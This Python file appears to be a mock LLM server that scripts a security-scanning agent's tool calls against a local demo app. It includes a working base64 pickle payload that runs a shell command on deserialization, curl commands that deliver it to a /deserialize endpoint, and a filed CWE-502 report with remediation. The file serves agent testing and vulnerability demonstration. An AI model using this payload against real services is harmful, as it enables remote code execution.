#!/usr/bin/env python3
"""Strix-format mock LLM server, variant: insecure deserialization -> RCE
(POST /deserialize, pickle.loads on attacker bytes) instead of SQLi, with
MORE scripted turns (payload build -> send -> verify -> report -> finish)
to demonstrate that both the vulnerability class and the turn count are
freely customizable in this script.
"""
import json
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LOG_PATH = "/tmp/mock_llm_deserialize/requests.jsonl"
state = {"n": 0}

# Base64(pickle) payload whose __reduce__ runs:
#   os.system("id > /tmp/pickle_rce_proof.txt")
PAYLOAD_B64 = (
    "gASVVQAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw5X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0o"
    "J2lkID4gL3RtcC9waWNrbGVfcmNlX3Byb29mLnR4dCcplIWUUpQu"
)

BUILD_PAYLOAD_CMD = (
    f"printf '%s' '{PAYLOAD_B64}' > /tmp/pickle_rce_payload.b64 && "
    "echo payload written"
)
SEND_PAYLOAD_CMD = (
    "curl -s -X POST --data-binary @/tmp/pickle_rce_payload.b64 "
    "http://127.0.0.1:5000/deserialize; echo"
)
VERIFY_CMD = "cat /tmp/pickle_rce_proof.txt 2>/dev/null || echo 'not found'"

REPORT_ARGS = {
    "title": "Insecure Deserialization (pickle) leads to Remote Code Execution in /deserialize",
    "description": (
        "The `/deserialize` endpoint base64-decodes the raw POST body and "
        "passes it straight to `pickle.loads()`. Python's pickle protocol "
        "supports object reconstruction via `__reduce__`, which lets an "
        "attacker-crafted payload execute arbitrary code during "
        "unpickling -- this is remote code execution, not a data-parsing bug."
    ),
    "target": "sqli-lab demo application, /deserialize endpoint",
    "endpoint": "/deserialize",
    "method": "POST",
    "impact": (
        "Any unauthenticated user who can POST to /deserialize can execute "
        "arbitrary OS commands with the privileges of the server process."
    ),
    "technical_analysis": (
        "The handler does `raw = base64.b64decode(body); obj = "
        "pickle.loads(raw)`. A crafted object whose `__reduce__` method "
        "returns `(eval, (\"__import__('os').system('...')\",))` causes "
        "`pickle.loads` to call that callable with those arguments during "
        "deserialization, running the embedded command."
    ),
    "poc_description": (
        "1. Build a pickle payload whose `__reduce__` runs `os.system(...)` "
        "to write proof-of-execution to a file, base64-encode it.\n"
        "2. POST the raw bytes to `/deserialize`.\n"
        "3. Read the proof file back -- its contents (the real output of "
        "the `id` command on the server) confirm OS-level code execution, "
        "not just a parsing error."
    ),
    "poc_script_code": (
        "printf '%s' '<base64 pickle payload>' > payload.b64\n"
        "curl -s -X POST --data-binary @payload.b64 http://127.0.0.1:5000/deserialize\n"
        "cat /tmp/pickle_rce_proof.txt   # -> real `id` output from the server process"
    ),
    "remediation_steps": (
        "Never call `pickle.loads()` on attacker-controlled input. Use a "
        "data-only format such as `json.loads()`, which cannot invoke "
        "arbitrary code during parsing. The sibling `/deserialize_safe` "
        "handler in this same file already does this correctly."
    ),
    "evidence": (
        "Exploit request: POST /deserialize with base64-decoded pickle "
        "payload -> server executed `id > /tmp/pickle_rce_proof.txt`; "
        "reading that file back returned the real `id` output of the "
        "server process, proving OS command execution."
    ),
    "assumptions": "None required -- RCE was reproduced directly against the running target.",
    "counterevidence": (
        "Checked that the response was not simply echoing the payload "
        "back unexecuted: the proof file did not exist before the request "
        "and contained real `id` output afterward, which pickle.loads() "
        "cannot produce without executing the embedded reduce callable."
    ),
    "confidence": "high",
    "severity_change_conditions": (
        "Would be lower if /deserialize were unreachable without "
        "authentication; no such gate was observed."
    ),
    "fix_effort": "low",
    "cvss_breakdown": {
        "attack_vector": "N", "attack_complexity": "L", "privileges_required": "N",
        "user_interaction": "N", "scope": "U",
        "confidentiality": "H", "integrity": "H", "availability": "H",
    },
    "cwe": "CWE-502",
    "code_locations": [
        {
            "path": "security-scan/sqli-lab/vulnerable_app.py",
            "start_line": 258, "end_line": 259,
            "label": "pickle.loads() on attacker-controlled bytes",
            "fix_before": (
                "        raw = base64.b64decode(body)\n"
                "        obj = pickle.loads(raw)"
            ),
            "fix_after": (
                "        obj = json.loads(body)"
            ),
        },
    ],
}

FINISH_ARGS = {
    "executive_summary": (
        "One finding was confirmed and filed: insecure deserialization "
        "(pickle) leading to remote code execution in /deserialize, "
        "reproduced live with a real OS-command proof. Scripted mock run "
        "(more turns than the earlier SQLi scenario: build payload -> "
        "send -> verify -> report -> finish)."
    ),
    "methodology": (
        "Scripted mock LLM: built a malicious pickle payload, sent it to "
        "/deserialize, verified real OS command execution via a proof "
        "file, filed the finding via create_vulnerability_report, then "
        "ended the scan."
    ),
    "technical_analysis": "See the filed vulnerability report for details.",
    "recommendations": "See the filed vulnerability report's remediation steps.",
}


def sse_chunk(w, obj):
    data = ("data: " + json.dumps(obj) + "\n\n").encode()
    w.write(("%x\r\n" % len(data)).encode() + data + b"\r\n")
    w.flush()


def sse_raw(w, raw_bytes):
    w.write(("%x\r\n" % len(raw_bytes)).encode() + raw_bytes + b"\r\n")
    w.flush()


def sse_end(w):
    w.write(b"0\r\n\r\n")
    w.flush()


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def do_POST(self):
        length = int(self.headers.get("content-length", 0))
        body = self.rfile.read(length)
        try:
            req = json.loads(body)
        except Exception:
            req = {"_raw": body.decode(errors="replace")}

        with open(LOG_PATH, "a") as f:
            f.write(json.dumps(req, ensure_ascii=False) + "\n")

        state["n"] += 1
        n = state["n"]
        tools = req.get("tools", [])
        sys.stderr.write(f"\n=== turn {n}: {len(tools)} tools, stream={req.get('stream')} ===\n")

        if not req.get("stream"):
            resp = {
                "id": f"chatcmpl-mock-{n}", "object": "chat.completion", "created": 0,
                "model": req.get("model", "mock-model"),
                "choices": [{"index": 0, "message": {"role": "assistant", "content": "OK"}, "finish_reason": "stop"}],
                "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2},
            }
            payload = json.dumps(resp).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)
            return

        self.send_response(200)
        self.send_header("Content-Type", "text/event-stream")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("Transfer-Encoding", "chunked")
        self.end_headers()

        base = {"id": f"chatcmpl-mock-{n}", "object": "chat.completion.chunk", "created": 0,
                "model": req.get("model", "mock-model")}

        if not tools:
            sse_chunk(self.wfile, {**base, "choices": [{"index": 0, "delta": {"role": "assistant", "content": "OK"}, "finish_reason": None}]})
            sse_chunk(self.wfile, {**base, "choices": [{"index": 0, "delta": {}, "finish_reason": "stop"}]})
        else:
            real_turns_seen = sum(1 for line in open(LOG_PATH) if json.loads(line).get("tools"))
            # 5-step script: build payload -> send -> verify -> report -> finish
            if real_turns_seen == 1:
                name, args = "exec_command", {"cmd": BUILD_PAYLOAD_CMD}
            elif real_turns_seen == 2:
                name, args = "exec_command", {"cmd": SEND_PAYLOAD_CMD}
            elif real_turns_seen == 3:
                name, args = "exec_command", {"cmd": VERIFY_CMD}
            elif real_turns_seen == 4:
                name, args = "create_vulnerability_report", REPORT_ARGS
            else:
                name, args = "finish_scan", FINISH_ARGS
            sys.stderr.write(f"    -> scripted call ({real_turns_seen}): {name}\n")

            call_id = f"call_mock_{n}"
            sse_chunk(self.wfile, {**base, "choices": [{
                "index": 0,
                "delta": {"role": "assistant", "tool_calls": [{
                    "index": 0, "id": call_id, "type": "function",
                    "function": {"name": name, "arguments": ""},
                }]},
                "finish_reason": None,
            }]})
            sse_chunk(self.wfile, {**base, "choices": [{
                "index": 0,
                "delta": {"tool_calls": [{"index": 0, "function": {"arguments": json.dumps(args)}}]},
                "finish_reason": None,
            }]})
            sse_chunk(self.wfile, {**base, "choices": [{"index": 0, "delta": {}, "finish_reason": "tool_calls"}]})

        sse_raw(self.wfile, b"data: [DONE]\n\n")
        sse_end(self.wfile)


if __name__ == "__main__":
    import os
    os.makedirs("/tmp/mock_llm_deserialize", exist_ok=True)
    open(LOG_PATH, "w").close()
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
    srv = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    sys.stderr.write(f"mock LLM server (deserialize scenario) listening on 127.0.0.1:{port}\n")
    srv.serve_forever()
